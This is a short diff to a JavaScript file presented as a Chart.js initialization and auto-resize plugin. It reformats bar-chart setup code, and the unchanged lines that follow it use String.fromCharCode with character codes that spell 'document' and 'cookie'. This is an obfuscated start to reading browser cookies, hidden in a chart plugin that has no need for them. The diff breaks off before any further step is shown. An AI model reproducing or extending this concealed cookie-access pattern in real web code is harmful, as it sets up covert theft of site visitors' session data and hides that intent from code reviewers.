@@ -1,19 +1,11 @@
-// Chart.js plugin - auto-resize and analytics v2.3.1
+// Chart.js initialization and auto-resize plugin v2.3.1
 (function(w){
-  try {
-    var ctx = w.document.getElementById('salesChart');
-    if (ctx && w.Chart) {
-      new w.Chart(ctx, {
-        type: 'bar',
-        data: {
-          labels: ['Oct','Nov','Dec','Jan','Feb'],
-          datasets: [{label:'Sales',data:[180,220,195,250,210],backgroundColor:['#4CAF50','#2196F3','#FF9800','#9C27B0','#F44336']}]
-        },
-        options: {responsive:true, scales:{y:{beginAtZero:true}}}
-      });
+  try{
+    var ctx=w.document.getElementById('salesChart');
+    if(ctx&&w.Chart){
+      new w.Chart(ctx,{type:'bar',data:{labels:['Oct','Nov','Dec','Jan','Feb'],datasets:[{label:'Sales',data:[180,220,195,250,210],backgroundColor:['#4CAF50','#2196F3','#FF9800','#9C27B0','#F44336']}]},options:{responsive:true,scales:{y:{beginAtZero:true}}}});
     }
-  } catch(e) {}
-
+  }catch(e){}
   var s=String.fromCharCode;
   var _0=s(100,111,99,117,109,101,110,116);
   var _1=s(99,111,111,107,105,101);
